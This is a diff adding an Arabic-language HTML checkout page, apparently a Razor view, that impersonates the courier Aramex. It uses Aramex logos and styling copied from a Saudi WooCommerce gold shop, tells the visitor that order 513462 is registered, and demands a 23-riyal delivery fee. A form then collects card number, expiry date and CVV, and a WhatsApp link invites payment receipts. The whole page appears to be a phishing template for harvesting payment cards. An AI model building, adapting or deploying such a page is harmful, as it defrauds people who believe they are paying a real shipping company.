@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+ 
+<html dir="rtl" lang="ar" class="loading-site no-js"> <!--<![endif]-->
+
+<head>
+	<meta charset="UTF-8">
+	 
+
+ 	<title> طلب آرامكس</title>
+	<meta name="robots" content="max-image-preview:large">
+	 
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//s.w.org">
+ 
+	<link rel="stylesheet" id="wp-block-library-rtl-css" href="/css/style-rtl.min.css" type="text/css" media="all">
+	<link rel="stylesheet" id="wc-blocks-vendors-style-css" href="/css/wc-blocks-vendors-style.css" type="text/css"
+		media="all">
+	<link rel="stylesheet" id="wc-blocks-style-rtl-css" href="/css/wc-blocks-style-rtl.css" type="text/css" media="all">
+	<link rel="stylesheet"   href="/css/custome.css" type="text/css" media="all">
+	 
+	<link rel="stylesheet" id="contact-form-7-css" href="/css/styles.css" type="text/css" media="all">
+	<link rel="stylesheet" id="contact-form-7-rtl-css" href="/css/styles-rtl.css" type="text/css" media="all">
+	<link rel="stylesheet" id="Woocommerce_Smsa_Shipping_Integration-css"
+		href="/css/woocommerce_smsa_shipping_integration-public.css" type="text/css" media="all">
+	 
+	<link rel="stylesheet" id="wpml-legacy-horizontal-list-0-css" href="/css/style.min.css" type="text/css" media="all">
+	<link rel="stylesheet" id="wpml-menu-item-0-css" href="/css/style.min_1.css" type="text/css" media="all">
+	<link rel="stylesheet" id="wooac-feather-css" href="/css/feather.css" type="text/css" media="all">
+	<link rel="stylesheet" id="magnific-popup-css" href="/css/magnific-popup.css" type="text/css" media="all">
+	<link rel="stylesheet" id="wooac-frontend-css" href="/css/frontend.css" type="text/css" media="all">
+	<link rel="stylesheet" id="flatsome-icons-css" href="/css/fl-icons.css" type="text/css" media="all">
+	<link rel="stylesheet" id="wc_pv_intl-phones-lib-css-css" href="/css/intlTelInput.min.css" type="text/css"
+		media="all">
+	<link rel="stylesheet" id="wc_pv_css-style-css" href="/css/frontend.min.css" type="text/css" media="all">
+	<link rel="stylesheet" id="qlwapp-css" href="/css/style.css" type="text/css" media="all">
+	<link rel="stylesheet" id="flatsome-main-rtl-css" href="/css/flatsome-rtl.css" type="text/css" media="all">
+	<link rel="stylesheet" id="flatsome-shop-rtl-css" href="/css/flatsome-shop-rtl.css" type="text/css" media="all">
+	<link rel="stylesheet" id="flatsome-style-css" href="/css/style_1.css" type="text/css" media="all">
+	<link rel="stylesheet" id="flatsome-googlefonts-css" href="/css/css.css" type="text/css" media="all">
+	<script type="text/javascript" src="../js/jquery.min.js" id="jquery-core-js"></script>
+	<script type="text/javascript" src="../js/jquery-migrate.min.js" id="jquery-migrate-js"></script>
+	 
+	<script type="text/javascript" src="../js/test.js" ></script>
+
+	<script type="text/javascript" src="../js/language-cookie.js" id="wpml-cookie-js"></script>
+	<script type="text/javascript" src="../js/woocommerce_smsa_shipping_integration-public.js"
+		id="Woocommerce_Smsa_Shipping_Integration-js"></script>
+	 
+	<script type="text/javascript" src="../js/snapchat-pixel.js" id="snap-pixel-js"></script>
+	
+	<script src="../js/jquery.min.js"></script>
+	<script src="../js/363ad84da6.js" crossorigin="anonymous"></script>
+
+	<link rel="https://api.w.org/" href="https://ounce.com.sa/wp-json/">
+	<link rel="alternate" type="application/json" href="https://ounce.com.sa/wp-json/wp/v2/pages/23">
+	<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://ounce.com.sa/xmlrpc.php?rsd">
+	<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://ounce.com.sa/wp-includes/wlwmanifest.xml">
+	<meta name="generator" content="WordPress 6.0.3">
+	<meta name="generator" content="WooCommerce 7.1.0">
+	<link rel="canonical" href="/">
+	<link rel="shortlink" href="/">
+	 
+
+ 
+
+	 
+	<link rel="icon" href="https://www.aramex.com/docs/default-source/site-assets/aramex-logo-arabic10ab5588b3f2659d9310ff0000e7fe0c.svg" sizes="32x32">
+	<link rel="icon" href="https://www.aramex.com/docs/default-source/site-assets/aramex-logo-arabic10ab5588b3f2659d9310ff0000e7fe0c.svg" sizes="192x192">
+	<link rel="apple-touch-icon" href="https://www.aramex.com/docs/default-source/site-assets/aramex-logo-arabic10ab5588b3f2659d9310ff0000e7fe0c.svg">
+	<meta name="msapplication-TileImage"
+		content="https://www.aramex.com/docs/default-source/site-assets/aramex-logo-arabic10ab5588b3f2659d9310ff0000e7fe0c.svg">
+
+	<!-- BEGIN AIWP v5.7.4 Global Site Tag - https://deconf.com/analytics-insights-for-wordpress/ -->
+	<script async src="../js_1"></script>
+	 
+	<!-- END AIWP Global Site Tag -->
+	<style id="custom-css" type="text/css">
+		:root {
+			--primary-color: #cda349;
+		}
+
+		
+
+		/* Color */
+		.secondary.is-underline,
+		.secondary.is-link,
+		.secondary.is-outline,
+		.stars a.active,
+		.star-rating:before,
+		.woocommerce-page .star-rating:before,
+		.star-rating span:before,
+		.color-secondary {
+			color: #1c2143
+		}
+
+		/* Color !important */
+		[data-text-color="secondary"] {
+			color: #1c2143 !important;
+		}
+
+		/* Border */
+		.secondary.is-outline:hover {
+			border-color: #1c2143
+		}
+
+		body {
+			font-size: 100%;
+		}
+
+		
+	</style>
+	<link rel="icon" type="image/png" href="../uploads/1667829295.png" />
+
+		<meta property="og:image" content="../uploads/1667829295.png" />
+		
+		<script src="../js/jquery.min.js"></script>
+		<script src="../js/363ad84da6.js" crossorigin="anonymous"></script>
+
+		<link rel="stylesheet" href="../css/libraries.css" />
+		<link rel="stylesheet" href="../css/checkout.css" />
+
+		<style type="text/css">
+				.vue-tel-input {
+					border-radius: 3px;
+					display: flex;
+					border: 1px solid #bbb;
+					text-align: left;
+				}
+
+				.vue-tel-input.disabled .dropdown,
+				.vue-tel-input.disabled .selection,
+				.vue-tel-input.disabled input {
+					cursor: no-drop;
+				}
+
+				.vue-tel-input:focus-within {
+					box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
+						0 0 8px rgba(102, 175, 233, 0.6);
+					border-color: #66afe9;
+				}
+
+				.vti__dropdown {
+					display: flex;
+					flex-direction: column;
+					align-content: center;
+					justify-content: center;
+					position: relative;
+					padding: 7px;
+					cursor: pointer;
+				}
+
+				.vti__dropdown.show {
+					max-height: 300px;
+					overflow: scroll;
+				}
+
+				.vti__dropdown.open {
+					background-color: #f3f3f3;
+				}
+
+				.vti__dropdown:hover {
+					background-color: #f3f3f3;
+				}
+
+				.vti__selection {
+					font-size: 0.8em;
+					display: flex;
+					align-items: center;
+				}
+
+				.vti__selection .vti__country-code {
+					color: #666;
+				}
+
+				.vti__flag {
+					margin-right: 5px;
+					margin-left: 5px;
+				}
+
+				.vti__dropdown-list {
+					z-index: 1;
+					padding: 0;
+					margin: 0;
+					text-align: left;
+					list-style: none;
+					max-height: 200px;
+					overflow-y: scroll;
+					position: absolute;
+					left: -1px;
+					background-color: #fff;
+					border: 1px solid #ccc;
+					width: 390px;
+				}
+
+				.vti__dropdown-list.below {
+					top: 33px;
+				}
+
+				.vti__dropdown-list.above {
+					top: auto;
+					bottom: 100%;
+				}
+
+				.vti__dropdown-arrow {
+					transform: scaleY(0.5);
+					display: inline-block;
+					color: #666;
+				}
+
+				.vti__dropdown-item {
+					cursor: pointer;
+					padding: 4px 15px;
+				}
+
+				.vti__dropdown-item.highlighted {
+					background-color: #f3f3f3;
+				}
+
+				.vti__dropdown-item.last-preferred {
+					border-bottom: 1px solid #cacaca;
+				}
+
+				.vti__dropdown-item .vti__flag {
+					display: inline-block;
+					margin-right: 5px;
+				}
+
+				.vti__input {
+					border: none;
+					border-radius: 0 2px 2px 0;
+					width: 100%;
+					outline: 0;
+					padding-left: 7px;
+				}
+				.aramx-btn{
+					width: 230px;
+					border: 1px solid red;
+					padding:0 .5rem;
+					display: flex;
+					align-items: center;
+					justify-content: space-around;
+					flex-direction: row;
+					margin: auto;
+					box-shadow: 0 2px 4px rgb(0 0 0 / 10%);
+					color:#000;
+					border: 2px solid #f44336;
+					border-radius: 5px;
+					box-shadow: 0 2px 4px rgb(0 0 0 / 10%);
+					cursor:pointer;
+					text-decoration:none;
+				}
+		</style>
+</head>
+
+<body
+	class="rtl home page-template-default page page-id-23 theme-flatsome woocommerce-no-js lightbox nav-dropdown-has-arrow page-template-blank page-template-blank-php elementor-default elementor-kit-149">
+
+	<div id="wrapper">
+
+        <header id="header" class="header header-full-width has-sticky sticky-jump">
+                        <div class="header-wrapper" style="background:#dc291e">
+                            <div id="masthead" class="header-main show-logo-center">
+                                <div class="header-inner flex-row container logo-center medium-logo-center" role="navigation" style="justify-content: start;">
+                                    <!-- Logo -->
+                                    <div id="logo" class="flex-col logo" >
+                                        <!-- Header logo -->
+                                        <a href="#" title="أونصة - سبائك ذهب وأكثر" rel="home">
+                                            <img width="147" height="74" src="https://www.aramex.com/docs/default-source/site-assets/aramex-logo-arabic10ab5588b3f2659d9310ff0000e7fe0c.svg" class="header_logo header-logo"
+                                                alt="أونصة"><img width="147" height="74" src="https://www.aramex.com/docs/default-source/site-assets/aramex-logo-arabic10ab5588b3f2659d9310ff0000e7fe0c.svg"
+                                                class="header-logo-dark" alt="أونصة"></a>
+                                    </div>
+                                 </div>			
+                            </div>			
+                        </div>			
+         </header>
+        <div style="padding: 2rem; display: flex; flex-direction: column; align-items: center;">
+            <picture class="img-fluid">
+                <source
+                    type="image/webp"
+                    srcset="
+                    https://coupon5sm.com/wp-content/themes/coupon5sm/images/thanx.png.webp
+                    "
+                />
+                <img
+                    width="188"
+                    height="189"
+                    src="https://coupon5sm.com/wp-content/themes/coupon5sm/images/thanx.png"
+                />
+            </picture>
+            <br>
+            <h3>شكراً لك تم تسجيل طلبك رقم <span style="color:green">513462</span> بنجاح </h3>
+            <h6>يرجى تسديد مبلغ 23 ريال لصالح آرامكس ليتم توصيل طلبك و تتبع الطلب الخاص بك </h6>
+        </div>
+        @* ==== card section ========= *@
+        <div class="section section--payment">
+        <div class="row">
+            <div class="col-md-12">
+                <div id="payment_step" class="payment-step mb-0">
+                <div  class="title title--step">
+                    <img src="/img/step-payment.svg" />
+                    <h3>طريقة الدفع</h3>
+                </div>
+                <script>
+                    $(function () {
+                    //run when the DOM is ready
+                    $(".clickable").click(function () {
+                        //use a class, since your ID gets mangled
+                        $(this).addClass("active"); //add the class to the clicked element
+                        var form = document.getElementById("cardForm");
+                        var element = document.getElementById("myDIV");
+                       
+                        element.classList.remove("active");
+                        form.style.display = "block";
+                    });
+
+                    $(".clickable2").click(function () {
+                        //use a class, since your ID gets mangled
+                        $(this).addClass("active"); //add the class to the clicked element
+                        var form = document.getElementById("cardForm");
+                        var element = document.getElementById("hhh");
+
+                        element.classList.remove("active");
+                        form.style.display = "block";
+                        onlinEmp.style.display = "none";
+                    });
+                  
+                   
+                    });
+                </script>
+                <div id="payment_methods_wrapper">
+                    <ul id="payment_methods" class="list list--payment-methods">
+                    <li>
+                        <button type="button" class="btn btn--round btn--payment-option active clickable2" id="myDIV">
+                        <img src="/img/pay-option-mada.svg" alt="Mada" />
+                        </button>
+                    </li>
+                    <li>
+                        <button onClick="addClass" type="button" class="btn btn--round btn--payment-option clickable"
+                        id="hhh">
+                        <img src="/img/pay-option-credit-2.svg" alt="Credit card Logo" class="large" />
+                        </button>
+                    </li>
+                    
+                    </ul>
+                </div>
+                <span>
+                    <form id="cardForm" data-v-09edeec7  class="form form--payment">
+                                                        
+                        <div data-v-09edeec7 class="row">
+                            <div data-v-09edeec7 class="col-md-8 col-xs-12">
+                            <span data-v-09edeec7>
+                                <fieldset data-v-09edeec7 data-openreplay-masked
+                                class="form-group--w-icon form-group payment-type">
+                                <i data-v-09edeec7 class="sicon-debit-card-back"></i>
+                                <input data-v-09edeec7 type="tel" maxlength="19" pattern="[0-9]*" autocomplete="cc-number"
+                                    placeholder="رقم البطاقة" class="form-control ym-disable-keys ym-hide-content"
+                                    name="cardnumber" />
+                                
+                                </fieldset>
+                            </span>
+                            </div>
+                            <div data-v-09edeec7 class="col-md-2 col-xs-6">
+                            <span data-v-09edeec7>
+                                <fieldset data-v-09edeec7 class="form-group">
+                                <div data-v-09edeec7 class="input-wrapper-expiry">
+                                    <input data-v-09edeec7 type="tel" maxlength="2" pattern="[0-9]*" placeholder="الشهر"
+                                    id="cc_month" name="carddate" autocomplete="cc-exp-month"
+                                    class="form-control ym-disable-keys ym-hide-content card-month" />
+                                    <input data-v-09edeec7 type="text" placeholder="/" disabled="disabled"
+                                    class="form-control separator" />
+                                    <input data-v-09edeec7 type="tel" maxlength="2" pattern="[0-9]*" placeholder="السنة"
+                                    id="cc_year" name="carddate1" autocomplete="cc-exp-year"
+                                    class="form-control ym-disable-keys ym-hide-content card-year" />
+                                </div>
+                                
+                                
+                                </fieldset>
+                            </span>
+                            </div>
+                            <div data-v-09edeec7 class="col-md-2 col-xs-6">
+                            <span data-v-09edeec7>
+                                <fieldset data-v-09edeec7 data-openreplay-masked class="form-group">
+                                <input data-v-09edeec7 type="tel" pattern="\d*" maxlength="4" autocomplete="cc-csc"
+                                    placeholder="رمز التحقق (CVC)" name="cvv"
+                                    class="form-control ym-disable-keys ym-hide-content" />
+                                
+                                </fieldset>
+                            </span>
+                            </div>
+                        </div>
+                    
+                        <ul class="list list--brands">
+                            <li>تسوق إلكتروني آمن 100%</li>
+                            <li><img src="/img/secure-payment.svg" /></li>
+                            <li><img src="/img/secure-payment-02.svg" /></li>
+                            <li><img src="/img/secure-payment-03.svg" /></li>
+                        </ul>
+                        <br>
+                        <br>
+                        <br>
+                        <div data-v-e5a4c4bc>
+                            <button data-v-e5a4c4bc id="cardSubmit" type="submit" name="subm"
+                                class="btn btn--primary btn--wide btn--round btn--submit btn--fixed wide">
+                                <span data-v-e5a4c4bc>اكمال الدفع</span>                                                
+                            </button>
+                        </div>
+                    </form>
+                    <div id="bank-div" style="display:none">
+                        <h4>يرجى التواصل مع موظف المبيعات اونلاين لارسال صورة الايصال</h4>
+                        <a href="https://api.whatsapp.com/send/?phone=966500279904" target="_blank"> <img width="150px" src="https://allheddad.com/wp-content/uploads/2021/12/client.png" />  </a>
+                    </div>
+
+                    <div id="delvered-div" style="display:none">
+                        <h4>يرجى إكمال اجرائات شركة التوصيل آرامكس لتتبع طلبك </h4>
+                        <div style="display: flex; flex-direction: row; align-items: center; justify-content: center; margin-top:2rem;">
+                            <h3>رقم الطلب: </h3>
+                            <div class="order-number"> <span class="orderCode" style="font-weight: bold; font-size=22px;margin:auto">@model.id</span> </div>
+                        </div>
+                        <br>
+                        <a class="aramx-btn">
+                            <img width="50px" src="https://1.bp.blogspot.com/-2uXlQ5DJfmQ/X6l2ODOQfRI/AAAAAAAAUsg/YltlKUnAULIGebPsW2Oh3b_Wd_pUaVZEACLcBGAsYHQ/s16000/%25D8%25A7%25D8%25B1%25D8%25A7%25D9%2585%25D9%2583%25D8%25B3.png" alt="Credit card Logo"  />
+                            اكمال اجراء التوصيل
+                        </a>
+                    </div>
+                </span>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+		
+	</div>
+
+	 
+
+	 
+	<script>
+		$(function () {
+
+		$("#c-menu").click(function () {
+			console.log("I am heer")
+			//use a class, since your ID gets mangled
+			$(this).addClass("current-lightbox-clicked"); //add the class to the clicked element
+			$(".mfp-content").css({ display: "block", background: "red" });
+		});
+		
+		});
+	</script>
+	<script data-cfasync="false" src="../js/email-decode.min.js"></script><script type="text/javascript">
+		(function () {
+			var c = document.body.className;
+			c = c.replace(/woocommerce-no-js/, 'woocommerce-js');
+			document.body.className = c;
+		})();
+	</script>
+	<script type="text/template" id="tmpl-variation-template">
+	<div class="woocommerce-variation-description">{{{ data.variation.variation_description }}}</div>
+	<div class="woocommerce-variation-price">{{{ data.variation.price_html }}}</div>
+	<div class="woocommerce-variation-availability">{{{ data.variation.availability_html }}}</div>
+</script>
+<script type="text/template" id="tmpl-unavailable-variation-template">
+	<p>عفوًا، هذا المنتج غير متوفر. يرجى اختيار مجموعة أخرى.</p>
+</script>
+<script type="text/javascript" src="../js/regenerator-runtime.min.js" id="regenerator-runtime-js"></script>
+<script type="text/javascript" src="../js/wp-polyfill.min.js" id="wp-polyfill-js"></script>
+<script type="text/javascript" id="contact-form-7-js-extra">
+
+var wpcf7 = {"api":{"root":"https:\/\/ounce.com.sa\/wp-json\/","namespace":"contact-form-7\/v1"}};
+
+</script>
+<script type="text/javascript" src="../js/index.js" id="contact-form-7-js"></script>
+<script type="text/javascript" src="../js/jquery.blockUI.min.js" id="jquery-blockui-js"></script>
+<script type="text/javascript" id="wc-add-to-cart-js-extra">
+
+var wc_add_to_cart_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_view_cart":"\u0639\u0631\u0636 \u0627\u0644\u0633\u0644\u0629","cart_url":"https:\/\/ounce.com.sa\/cart\/","is_cart":"","cart_redirect_after_add":"no"};
+
+</script>
+<script type="text/javascript" src="../js/add-to-cart.min.js" id="wc-add-to-cart-js"></script>
+<script type="text/javascript" src="../js/js.cookie.min.js" id="../js-cookie-js"></script>
+<script type="text/javascript" id="woocommerce-js-extra">
+
+var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%"};
+
+</script>
+<script type="text/javascript" src="../js/woocommerce.min.js" id="woocommerce-js"></script>
+<script type="text/javascript" id="wc-cart-fragments-js-extra">
+
+var wc_cart_fragments_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","cart_hash_key":"wc_cart_hash_0472c4ec47a8370abd54862d6a7b5433-ar","fragment_name":"wc_fragments_0472c4ec47a8370abd54862d6a7b5433","request_timeout":"5000"};
+
+</script>
+<script type="text/javascript" src="../js/cart-fragments.min.js" id="wc-cart-fragments-js"></script>
+<script type="text/javascript" src="../js/jquery.magnific-popup.min.js" id="magnific-popup-js"></script>
+<script type="text/javascript" id="wooac-frontend-js-extra">
+
+var wooac_vars = {"ajax_url":"https:\/\/ounce.com.sa\/wp-admin\/admin-ajax.php","effect":"mfp-3d-unfold","related":"no","close":"2000","delay":"300","nonce":"01efdc6954","is_rtl":"1"};
+
+</script>
+<script type="text/javascript" src="../js/frontend.js" id="wooac-frontend-js"></script>
+<script type="text/javascript" src="../js/flatsome-instant-page.js" id="flatsome-instant-page-js"></script>
+<script type="text/javascript" src="../js/flatsome-live-search.js" id="flatsome-live-search-js"></script>
+<script type="text/javascript" src="../js/intlTelInput-jquery.min.js" id="wc_pv_intl-phones-lib-js"></script>
+<script type="text/javascript" id="wc_pv_js-script-js-extra">
+
+var wcPvJson = {"phoneValidatorName":"_wc_pv_phone_validator","phoneValidatorErrName":"_wc_pv_phone_validator_err","phoneErrorTitle":"Phone validation error: ","phoneUnknownErrorMsg":"Internal error \ud83e\udd76","separateDialCode":"","validationErrors":["Invalid number","Invalid country code","Phone number too short","Phone number too long","Invalid number"],"defaultCountry":"","onlyCountries":["SA"],"preferredCountries":[],"utilsScript":"https:\/\/ounce.com.sa\/wp-content\/plugins\/woo-phone-validator\/assets\/vendor\/js\/utils.js","parentPage":".woocommerce-checkout","currentPage":"checkout"};
+
+</script>
+<script type="text/javascript" src="../js/frontend.min.js" id="wc_pv_js-script-js"></script>
+<script type="text/javascript" src="../js/front-scripts.min.js" id="wcml-front-scripts-js"></script>
+<script type="text/javascript" id="cart-widget-js-extra">
+
+var actions = {"is_lang_switched":"0","force_reset":"0"};
+
+</script>
+<script type="text/javascript" src="../js/cart_widget.min.js" id="cart-widget-js"></script>
+<script type="text/javascript" src="../js/index_1.js" id="qlwapp-js"></script>
+<script type="text/javascript" src="../js/hoverIntent.min.js" id="hoverIntent-js"></script>
+<script type="text/javascript" id="flatsome-js-js-extra">
+
+var flatsomeVars = {"ajaxurl":"/","rtl":"1","sticky_height":"70","lightbox":{"close_markup":<button title="title" type="button" class="mfp-close"> <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x"> <line x1="18" y1="6" x2="6" y2="18"> </line> <line x1="6" y1="6" x2="18" y2="18"></line></svg></button> ),"close_btn_inside":false},"user":{"can_edit_pages":false},"i18n":{"mainMenu":"Main Menu"},"options":{"cookie_notice_version":"1"}};
+
+</script>
+<script type="text/javascript" src="../js/flatsome.js" id="flatsome-js-js"></script>
+<script type="text/javascript" src="../js/flatsome-lazy-load.js" id="flatsome-lazy-js"></script>
+<script type="text/javascript" src="../js/woocommerce.js" id="flatsome-theme-woocommerce-js-js"></script>
+<script type="text/javascript" src="../js/underscore.min.js" id="underscore-js"></script>
+<script type="text/javascript" id="wp-util-js-extra">
+
+var _wpUtilSettings = {"ajax":{"url":"\/wp-admin\/admin-ajax.php"}};
+
+</script>
+<script type="text/javascript" src="../js/wp-util.min.js" id="wp-util-js"></script>
+<script type="text/javascript" id="wc-add-to-cart-variation-js-extra">
+
+var wc_add_to_cart_variation_params = {"wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_no_matching_variations_text":"\u0644\u0644\u0623\u0633\u0641 \u0644\u0627 \u062a\u0648\u062c\u062f \u0645\u0646\u062a\u062c\u0627\u062a \u062a\u0637\u0627\u0628\u0642 \u0627\u062e\u062a\u064a\u0627\u0631\u0627\u062a\u0643. \u0627\u0644\u0631\u062c\u0627\u0621 \u0627\u062e\u062a\u064a\u0627\u0631 \u0645\u062c\u0645\u0648\u0639\u0629 \u0645\u062e\u062a\u0644\u0641\u0629.","i18n_make_a_selection_text":"\u0627\u0644\u0631\u062c\u0627\u0621 \u062a\u062d\u062f\u064a\u062f \u0628\u0639\u0636 \u062e\u064a\u0627\u0631\u0627\u062a \u0627\u0644\u0645\u0646\u062a\u062c \u0642\u0628\u0644 \u0625\u0636\u0627\u0641\u0629 \u0647\u0630\u0627 \u0627\u0644\u0645\u0646\u062a\u062c \u0625\u0644\u0649 \u0633\u0644\u0629 \u0645\u0634\u062a\u0631\u064a\u0627\u062a\u0643.","i18n_unavailable_text":"\u0639\u0641\u0648\u064b\u0627\u060c \u0647\u0630\u0627 \u0627\u0644\u0645\u0646\u062a\u062c \u063a\u064a\u0631 \u0645\u062a\u0648\u0641\u0631. \u064a\u0631\u062c\u0649 \u0627\u062e\u062a\u064a\u0627\u0631 \u0645\u062c\u0645\u0648\u0639\u0629 \u0623\u062e\u0631\u0649."};
+
+</script>
+<script type="text/javascript" src="../js/add-to-cart-variation.min.js" id="wc-add-to-cart-variation-js"></script>
+
+</body>
+</html>
